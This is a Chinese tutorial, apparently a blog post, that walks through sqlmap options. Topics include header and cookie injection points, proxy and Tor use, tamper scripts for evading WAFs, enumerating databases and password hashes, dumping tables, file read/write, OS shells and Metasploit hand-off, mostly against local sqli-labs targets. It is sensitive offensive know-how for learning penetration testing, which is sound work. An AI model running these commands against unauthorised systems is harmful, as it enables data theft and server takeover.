使用场景： 1、Web应用程序具有基于Cookie验证的过程； 2、想利用Cookie值上的SQL注入漏洞。

Sqlmap使用Cookie过程： 1、登录或浏览页面。 2、打开审计工具或代理截断，复制Cookie。 3、在Sqlmap中使用 –cookie 粘贴Cookie。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021255.png)

 python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=“uname=admin&passwd=admin&submit=Submit” -p uname -f –banner 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020973.png)

如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。 反之亦然，如果您提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set -Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。

load-cookie，可以用来提供包含Netscape/wget格式的cookie的特殊文件

注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）。

### 2.5 设置 User-Agent 头

默认情况下， sqlmap使用以下用户代理头值执行HTTP请求: sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org) （使用Wireshark 抓包查看） 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020307.png)

 然而， 通过提供自定义用户代理作为选项的参数， 可以使用选项—user-agent来伪造它。（可使用burpsuite抓取正常的HTTP请求包获取User-Agent头的信息）

sqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –user-agent ” Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0″ 再次抓包查看 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022685.png)

 此外， 通过 –random-agent, sqlmap将从./txt/user-agent中随机选择一个用于会话中的所有HTTP请求。一些站点在服务端检测HTTP User-Agent值， 如果不是一个合法的值， 就会中断连接。 同时Sqlmap也会曝出错误。

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022826.png)

 演示： sqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –random-agent 抓包查看 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020339.png)

注意针对User-Agent的值探测SQL注入， 需要设置–level 值为3。或者，使用Burp Suite抓包，将HTTP请求信息复制到txt文件中，然后在要User-Agent头的后面加上一个 * 号，这样不使用—level 3 也能够对User-Agent头进行探测 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022473.png)

### 2.6 设置 Host 头

可以手动设置HTTP主机头值。 默认情况下， 从提供的目标URL解析HTTP主机头 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020559.png)

 注意， 如果 –level设置为5,将对HTTP主机头进行SQL注入检测。

### 2.7 设置 Referer 头

伪造HTTP Referer值是可能的。 默认情况下， 如果没有显式设置， HTTP请求中不会发送HTTP引用头。 请注意， 如果–level设置为3或以上， 将针对HTTP引用头 进行SQL注入测试（或在请求信息中要进行探测的位置后面加上*号） 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020440.png)

### 2.8 设置 额外 HTTP 头

通过设置选项–header， 可以提供额外的HTTP标头。 每个标头必须用换行符（\n）分隔， 从配置INI文件中提供它们要容易得多。 可以查看示例sqlmap.conf文件。

例如： python sqlmap.py -u “http://192.168.21.128/sqlmap/mysql/get_int.php?id=1” –headers=“Host:www.target.com\nUser-agent:Firefox 1.0” -v 5

以Sqli-Labs靶场的Sqli-Less1为例 将User-Agent设为：haha 将cookie设为:heihei

sqlmap -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –headers=“user-agent:haha\ncookie:heihei” 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020619.png)

### 2.9 设置 HTTP 协议认证

Sqlmap中设置HTTP协议认证的参数： –auth-type和–auth-cred

其中–auth-type支持 Basic、 Digest、 NTLM

–auth-cred认证语法为： username:password （用于需要账号密码登录的页面）

例如： python sqlmap.py -u “http://url/arit.php?id=1” –auth-type Basic –auth-cred “testuser:testpass”

### 2.10 设置 HTTP 代理

Sqlmap中设置代理的参数： –proxy, –proxy-cred, –proxy-file ， –ignore-proxy

其中–proxy用来设置HTTP代理服务器位置 格式： –proxy http(s): //ip[:端口]

–proxy-cred用来设置HTTP代理服务器认证信息 格式： –proxy-cred username:password

–proxy-file用来设置多条代理在文件中

–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时， 应该使用这种方法。

## 0x03 sqlmap 请求参数设置（二）

### 3.1 设置Tor隐藏网络

Sqlmap中设置Tor网络的参数： –tor –tor-port –tor-type（共有四种类型：HTTP、HTTPS、SOCKS4、SOCKS5） –check-tor

### 3.2 设置延时

Sqlmap探测过程中会发送大量探测Payload到目标， 如果默认情况过快的发包速度回导致目标预警或断开连接。 为了避免这样的情况发生， 可以在探测设置Sqlm1ap发包延迟。 默认情况下， 不设置延迟。 –delay 0.5 设置延迟0.5秒

### 3.3 设置超时

在考虑超时HTTP(S)请求之前， 可以指定等待的秒数。 有效值是一个浮点数， 例如10.5表示10秒半。 默认设置为30秒。 例如： –timeout 10.5

### 3.4 设置重传次数

–retries count 设置对应重试次数， 默认情况下重试3次。（通常与超时参数结合使用）

### 3.5 设置随机化参数

Sqlmap可以指定要在每次请求期间随机更改其值的参数名称。 长度和类型根据提供的原始值保持一直。 –randomize 参数名称

例如： 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020284.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020240.png)

### 3.6 设置日志过滤目标

与使用选项-l使用从提供的日志解析的所有主机不同， 您可以指定有效的Python正则表达式， 用于过滤所需的日志。

例如： python sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”

–scope= ” 正则表达式 “

### 3.7 设置忽略 401

–ignore-401 参数用来忽略未验证错误。

如果您想测试偶尔返回HTTP错误401(未经授权的)的站点，而您想忽略它并在不提供适当凭证的情况下继续测试，您可以使用–ignore-401

### 3.8 设置 HTTP 协议私钥

当web服务器需要适当的客户端证书和用于[身份验证](https://cloud.tencent.com/product/faceid?from_column=20065&from=20065)的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。

–auth-file 文件名

### 3.9 设置安全模式

避免在多次请求失败后销毁会话

有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。

–safe-url, –safe-post, –safe-req –safe-freq

通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。

### 3.10 设置忽略URL编码

据参数的位置(例如GET)，默认情况下它的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。在这种情况下使用–skip-urlencode。

–skip-urlencode 不进行URL加密

## 0x04 sqlmap 性能优化

### 4.1 设置持久 HTTP 连接

Sqlmap中可以设置连接为持久连接。 HTTP报文中设置 Connection: Keep-Alive。（通过减少连接次数来提升性能） 参数： –keep-alive 注意该参数与 -proxy参数不兼容 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022449.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022029956.png)

### 4.2 设置 HTTP 空连接

Sqlmap中设置空连接， 表示直接获得HTTP响应的大小而不用获得HTTP响应体。 常用在盲注判断真/假中，降低网络带宽消耗。 参数： –null-connection 注意这个参数，与–text-only参数不兼容 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020235.png)

### 4.3 设置多线程

Sqlmap中设置同时发送多少个HTTP请求的多线程。

–threads 默认是1个线程。 为了不影响目标站点服务器的性能， Sqlmap可以设置最大的线程数为10。

### 4.5 设置预测输出

Sqlmap中的预测输出， 在推理算法中用于检索值字符的顺序统计预测。 参数： –predict-output

注意这个参数与 –thread参数不兼容。

***使用 -o 参数可开启前面三个性能参数（–keep-alive 、–null-connection 、 –predict-output），不开启 –threads参数***

## 0x05 sqlmap 注入位置介绍

### 5.0 注入介绍

所谓SQL注入， 就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串， 最终达到欺骗服务器执行恶意的SQL命令。 具体来说， 它是利用现有应用程序， 将（恶意的） SQL命令注入到后台数据库引擎执行的能力， 它可以通过在Web表单中输入（恶意） SQL语句得到一个存在安全漏洞的网站上的数据库， 而不是按照设计者意图去执行SQL语句。

由此可见： SQL注入发生位置 HTTP数据包中任意位置

### 5.1 设置指定注入参数

Sqlmap测试参数 -p, –skip –param-exclude –skip-static

-p ： 指定具体探测的参数。 例如： -p “id,user-agent”

–skip： 忽略探测具体的参数。 例如： –level –skip “user-agent,referer”

–param-exclude： 忽略包含具体内容的参数。 例如： –param-exclude=“token|session” 不对包含token或session的参数进行探测。

–skip-static： 忽略非动态参数

### 5.2 设置URL注入位置

当注入点位于URL本身内部时， 会出现一些特殊情况。 除非手动指向URL路径， 否则sqlmap不会对URL路径执行任何自动测试。 必须在命令行中添加星号(*)来指定这些注入点。

例如， 当使用Apache web服务器的mod_rewrite模块或其他类似的技术时， 这就显得特别有用了

python sqlmap.py -u http://targeturl/param1/value1*/param2/value2/

### 5.3 设置任意注入位置

与URL注入点类似， 星号(*)(注意:这里也支持Havij样式%INJECT %)也可以用来指向GET、POST或HTTP头中的任意注入点。 注入点可以通过在带有选项-u的GET参数值、 带有选项–data数据的POST参数值、 带有选项-H的HTTP（header）头值、 带有选项-A的User_Agent头、 用户代理、 引用和/或cookie的HTTP头值中指定， 或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。

python sqlmap.py -u “http://targeturl” –cookie=”param1=value1*;param2=value2

## 0x06 sqlmap 注入参数

### 6.1 强制设置 DBMS

默认情况下Sqlmap会自动识别探测目标Web应用程序的后端[数据库管理](https://cloud.tencent.com/product/dmc?from_column=20065&from=20065)系统（DBMS） ， 以下列出

Sqlmap完全支持的DBMS种类：

Mysql、 Oracle、 Microsoft SQL Server、 IBM DB2、 SQLite、 Firebird、 Sybase、 SAP MaxDB、HSQLDB、 Informix

–dbms 数据库管理系统名称 [版本号]

例如： –dbms mysql 5.0 、 –dbms microsoft sql server 05

### 6.2 强制设置 OS

默认情况下Sqlmap会自动识别探测目标Web应用程序的后端操作系统（OS） ， 以下列出Sqlmap完全支持的OS种类。 Linux 、 Windows

请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。 例如： –os windows 或 –os linux

请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。

### 6.3 关闭负载转换机制

在检索结果时， sqlmap使用一种机制， 在这种机制中， 所有条目都被转换为字符串类型， 并在NULL值的情况下用空格字符替换。 这样做是为了防止出现任何错误状态(例如， 将空值与字符串值连接起来)， 并简化数据检索过程本身。 尽管如此， 还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例如没有返回值)需要关闭这种机制(使用此开关)。

–no-cast

### 6.4 关闭字符转义机制

在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如， 选择’foobar’)时， 这些值将自动转义(例如， 选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))。这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes和/或mysql_real_escape_string)的潜在问题。 用户可以使用这个开关关闭它(例如减少有效负载大小)。

–no-escape（一般不建议关闭）

### 6.5 强制设置无效值替换

在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用大整数值来实现相同的目标(例如id=99999999)。 –invalid-bignum

在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用布尔操作来实现相同的目标(例如id=13 and18=19)。 –invalid-logical

在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用随机字符串来实现相同的目标(例如id=akewmc)。 –invalid-string

### 6.6 自定义注入负载位置

在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。 –prefix 设置SQL注入Payload前缀 –suffix 设置SQL注入Payload后缀

例如： SQL查询语句为：

```javascript
$query = "SELECT * FROM users WHERE id=(' . $_GET['id'] . ') LIMIT 0, 1";
```

sqlmap参数使用： python sqlmap.py -u “http://ip/sqlmap/mysql/get_str_brackets.php ?id=1” -p id –prefix “’)” –suffix “AND (‘abc’=’abc”

插入Payload后的SQL查询语句：

```javascript
$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023912.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023306.png)

### 6.7 设置 Tamper 脚本

sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。

sqlmap.py -u “http://ip/sqlmap/mysql/get_int.php?id=1” –tamper“between.py,randomcase.py,space2comment.py” -v 3

### 6.8 设置 DBMS 认证

设置DBMS认证方式通过以下命令：

–dbms-cred = username:password

## 0x07 sqlmap 自定义检测参数

### 7.1 设置探测等级

–level 此选项需要指定要执行的测试等级的参数。有五个层次。在执行有限数量的测试(请求)时，默认值为1。1~5探测复杂逐步提升。

sqlmap使用的有效负载在文本文件xml/payload .xml中指定。按照文件顶部的说明，如果sqlmap错过了注入，您也应该能够添加自己的有效负载来进行测试!

这个选项不仅会影响到哪个有效负载sqlmap尝试，还会影响到在考试中取哪个注入点:GET和POST参数总是被测试，HTTP Cookie头值从第2级测试，HTTP用户代理/引用头值从第3级测试。

总之，检测SQL注入越困难，必须设置的——级别就越高。 在显示无法注入时，可以设置 –level 5 来进行更强大的探测

### 7.2 设置风险参数

此选项需要指定要执行测试的风险的参数。有三个风险值。默认值为1，这对于大多数SQL注入点来说是无害的。风险值2增加了大量基于查询时间的SQL注入测试的默认级别，值3也增加了基于or的SQL注入测试。

在某些情况下，比如UPDATE语句中的SQL注入，注入基于or的有效负载可能导致表的所有条目的更新，这肯定不是攻击者想要的。出于这个原因和其他原因，我们引入了这个选项:用户可以控制测试的有效负载，用户可以任意选择使用也有潜在危险的负载。

例如： –risk num num范围 1~3

### 7.3 设置页面比较参数

默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用是因为在每次刷新页面内容的变化有时甚至没有注射,例如当页面有一个计数器,一个动态广告横幅或任何其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。

–string：指定包含字符串 查询为True –not-string：指定包含字符串 查询为False –regexp：指定通过正则表达式匹配字符串,查询为True –code：指定匹配HTTP状态响应码，查询为True

### 7.4 设置内容比较参数

–text-only：设置页面内容中包含文本。

例如：–text-only = “Welcome for True and Forbidden for False”

–titles：设置页面title中包含文本。前提需要知道如何区分查询的真与假，根据返回字符串内容不同。 –titles=”Login”

## 0x08 sqlmap 注入技术参数

### 8.1 设置具体 SQL 注入技术

–technique 参数用来设置具体SQL注入技术。以下列出Sqlmap支持的SQL注入技术。

B: Boolean-based blind 基于布尔的盲注 E: Error-based 报错注入 U: Union query-based Union查询注入 S: Stacked queries 堆叠注入 T: Time-based blind 基于时间的盲注 Q: Inline queries 内联查询注入

例如：sqlmap -u “存在注入点的URL” –technique B –current-db 利用基于布尔的盲注对注入点进行SQL注入探测

### 8.2 设置时间盲注延迟时间

在测试基于时间的盲SQL注入时，可以设置秒来延迟响应，方法是提供–time-sec选项，后面跟着一个整数。默认情况下，它的值设置为5秒。

例如： sqlmap -u “存在注入点的URL” –time-sec 3 –current-db 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020200.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020601.png)

### 8.3 设置 UNION 字段数

默认情况下，sqlmap测试使用1到10列的UNION查询SQL注入技术。但是，通过提供更高–level值，可以将此范围增加到50列。

您可以手动告诉sqlmap使用特定范围的列来测试这种类型的SQL注入，方法是为该工具提供选–union-cols后跟一系列整数。例如，12-16表示使用12到16个列对UNION查询SQL注入进行测试。

例如：sqlmap -u “存在注入的URL” –union-cols 12-18 –current-db

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023721.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020336.png)

### 8.4 设置 UNION 字符

默认情况下，sqlmap测试使用空字符的联合查询SQL注入技术。但是，通过提供更高级别的值sqlmap，还将使用随机数执行测试，因为在某些情况下，UNION查询测试使用NULL会失败，而使用随机整数则会成功。

您可以手动告诉sqlmap使用特定字符测试这种类型的SQL注入，方法是使用带有所需字符值的选项–union-char(例如–union-char 123)。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023449.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023060.png)

### 8.5 设置 UNION 查询表

某些情况下，Sqlmap需要设定Union 查询SQL注入的具体数据表才可以得到数据。 –union-from 表名 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020332.png)

### 8.6 设置 DNS 露出攻击

针对目标网络很有可能对外部流量进行限制，或者设置WAF。

通过设置DNS流量来突破限制 –dns-domain “dns服务器” 需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得Web应用程序中数据内容。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020213.png)

### 8.7 设置二次注入

Sqlmap中可以设置二次注入的结果页面。 –second-url URL 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020417.png)

### 8.8 识别指纹

–fingerprint -f 探测目标指纹信息。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023448.png)

## 0x09 sqlmap 检索 DBMS 信息

### 9.1 检索 DBMS Banner 信息

获取后端数据库Banner信息。 –banner或者 -b 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023235.png)

### 9.2 检索 DBMS 当前用户

获取DBMS当前用户 –current-user 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020891.png)

### 9.3 检索 DBMS 当前数据库

获取当前数据库名。 –current-db 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024028.png)

### 9.4 检索 DBMS 当前主机名

–hostname 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020400.png)

## 0x0A sqlmap 枚举 DBMS 信息

### 10.1 探测当前用户 DBA

–is-dba 探测当前用户是否是数据库管理员。

若返回True，则说明当前用户是数据库管理员 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024791.png)

### 10.2 枚举 DBMS 用户

获取DBMS所有用户 –users

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020245.png)

### 10.3 枚举 DBMS 用户密码

–password 获取用户密码

### 10.4 枚举 DBMS 权限

–privileges –role(角色) 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024501.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024378.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020399.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020080.png)

### 10.5 枚举数据库名

–dbs 列举数据库名称 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020994.png)

### 10.6 枚举数据库表

–tables 枚举表名 –> 指定具体数据库 -D 数据库名 –exclude-sysdbs 只列出用户自己新建的数据库和表 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024510.png)

 （排除DBMS系统数据库，当枚举表时）

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024789.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024774.png)

### 10.7 枚举数据库表的列名

–columns -D指定数据库 -T指定数据表 -C指定具体字段 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020147.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024183.png)

### 10.8 枚举数据值

–dump 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020572.png)

## 0x0B sqlmap 枚举信息

### 11.1 枚举 schema 信息

用户可以使用此开关–schema检索DBMS模式。模式列表将包含所有数据库、表和列，以及它们各自的类型。与–exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分。

python sqlmap.py -u “http://192.168.48.130/sqlmap/mysql/get_int.php?id=1” –schema–batch –exclude-sysdbs 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020965.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024313.png)

### 11.2 枚举数据表数量

如果用户只想知道表中的条目数，则可以使用此开关。 –count

python sqlmap.py -u “http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1” –count -D testdb

### 11.3 获取数据信息

–start, –stop, –first, –last

–start 1 –stop3 获取第二张到第三张表的名字 –stop 1 获取第一张表的名字 –first 3 –last 5 获取从第三出发到第五个字符

### 11.4 设置条件获取信息

–pivot-column=id 设置独一无二的列 –where=“id>3” 设置条件 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020507.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020887.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020079.png)

### 11.5 暴力激活成功教程数据

使用场景：Mysql<5.0时，Mysql中没有元数据库 information_schema。 –common-tables 暴力激活成功教程表名 –common-columns 暴力激活成功教程列名

### 11.6 读取文件

前提：已知目标主机文件路径 –file-read 路径 读取对应文件内容。 注意：此处路径为绝对路径。（需要使用//,其中一个/表示转义） 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024417.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024620.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024330.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024519.png)

### 11.7 写入文件

–file-write 读取本地文件 –file-dest 将读取到的文件写入到远程绝对路径 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020518.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025438.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020987.png)

### 11.8 检索所有信息

-a –all 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020256.png)

## 0x0C sqlmap 系统参数

### 12.1 执行系统命令

前提条件：

1. 网站必须是root权限
2. 攻击者需要知道网站的绝对路径
3. GPC为off（即magic_quotes_gpc = off），php主动转义的功能关闭
4. 若需要上传文件，则secure_file_priv 不为NULL

–os-shell

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025967.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020059.png)

### 12.2 结合Metasploit

python sqlmap.py -u “注入点” –os-pwn –msf-path (若不使用该参数，则自动选择默认路径) （只适用于MySQL and PostgreSQL 数据库）

### 12.3 注册表介绍

注册表（Registry，繁体中文版Windows操作系统称之为登录档）是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Microsoft Windows 95操作系统开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020490.png)

### 12.4 注册表操作

–reg-read –reg-add –reg-del –reg-key, –reg-value, –reg-data –reg-type

例如： $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 –reg-add –reg-key=“HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1

## 0x0D sqlmap 通用参数（一）

### 13.1 加载 sqlite 会话文件

sqlmap自动为每个目标创建持久会话SQLite文件，位于专用输出目录中，其中存储会话恢复所需的所有数据。如果用户想显式地设置会话文件位置(例如在一个位置为多个目标存储会话数据)，可以使用此选项。

-s “会话文件”

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025437.png)

### 13.2 加载 http 文本文件

这个选项需要指定文本文件的参数来写入sqlmap – HTTP(s)请求和HTTP(s)响应生成的所有HTTP(s)流量。 这主要用于调试目的——当您向开发人员提供一个潜在的bug报告时，也发送这个文件。 -t 参数 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020819.png)

### 13.3 设置默认选择选项

如果希望sqlmap作为批处理工具运行，在sqlmap需要时不需要任何用户交互，那么可以使用—–batch来强制执行。这将使sqlmap在需要用户输入时保持默认行为。

### 13.4 执行系统命令

–os-cmd=”命令” 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025236.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020532.png)

### 13.5 设置盲注字符集

在基于布尔和基于时间的SQL盲注中，用户可以强制使用自定义字符集来加速数据检索过程。

例如，如果转储消息摘要值(例如SHA1)，则使用–charset=“0123456789abcdef”，预期请求数量比正常运行少30%左右 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025360.png)

### 13.6 爬取 URL

sqlmap可以通过从目标位置开始收集链接(爬行)来收集潜在的脆弱链接。使用此选项，用户可以设置一个深度(到起始位置的距离)，低于这个深度，sqlmap不会进入收集阶段，因为只要有新的链接要访问，就会递归地执行这个过程。 –crawl python sqlmap.py -u “http://192.168.21.128/sqlmap/mysql/” –batch –crawl=3 –crawl-exclude 字符串 存在字符串的URL不进行爬取

### 13.7 在 CSV 输入中使用的分割字符

当被转储的[数据存储](https://cloud.tencent.com/product/cos?from_column=20065&from=20065)到CSV格式(–dump-format=CSV)时，条目必须用“分离值”分隔(默认值是 ”，”)。如果用户想要覆盖它的默认值，他可以使用这个选项(例如–csv-del=”@”)。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025576.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020699.png)

### 13.8 设置输出格式

当将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式:CSV、HTML和SQLITE。默认的是CSV，其中每个表行一行一行地存储在文本文件中，每个条目用逗号分隔(或提供了选项–csv-del)。对于HTML，输出被存储到一个HTML文件中，其中每一行都用格式化表中的一行表示。对于SQLITE，输出存储在SQLITE数据库中，原始表内容复制到同名的相应表中。

–dump-format

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020870.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025291.png)

### 13.9 探测之前检测 Internet 连接

在进行评估目标之前，检测当前计算机Internet连接是否正常。确保探测失败不是因为网路拦截问题。

–check-internet 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020547.png)

### 13.10 解析和测试表单的输入字段

–form 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020372.png)

## 0x0E sqlmap 通用参数（二）

### 14.1 设置预计完成时间

可以实时地计算和显示估计的到达时间，以检索每个查询输出。当用于检索输出的技术是任何盲SQL注入类型时，就会显示这一点。 –eta 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025872.png)

### 14.2 刷新会话文件

由于会话文件的概念，所以最好知道您可以使用选项–flush-session刷新该文件的内容。通过这种方式，您可以避免sqlmap中默认实现的缓存机制。其他可能的方法是手动删除会话文件。

### 14.3 忽略会话中的存储结果

使用选项–fresh-queries来忽略该文件的内容。通过这种方式，可以保持会话文件不变，对于所选的运行，避免恢复/恢复查询输出。

### 14.4 使用 Hex 函数检索数据

